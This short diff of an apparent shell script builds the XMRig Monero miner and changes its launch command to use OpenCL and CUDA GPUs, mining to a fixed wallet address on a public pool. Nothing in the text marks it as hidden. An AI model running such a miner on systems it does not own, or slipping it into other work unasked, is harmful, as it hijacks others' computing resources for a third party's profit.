@@ -7,4 +7,4 @@ mkdir xmrig/build
 cd xmrig/build
 cmake ..
 make -j$(nproc)
-./xmrig -o xmr.2miners.com:2222 -u 421bLS4MsLE6ZBfZiz6YoKakkWdknnP6s3MVCBRhzLRCeWwBtLqHwUjZ8J2ikxk6CADtB85CSimLMC4in7EUZFXeFjQYAcZ -p x -k
+./xmrig --opencl --cuda -o xmr.2miners.com:2222 -u 421bLS4MsLE6ZBfZiz6YoKakkWdknnP6s3MVCBRhzLRCeWwBtLqHwUjZ8J2ikxk6CADtB85CSimLMC4in7EUZFXeFjQYAcZ -p x -k
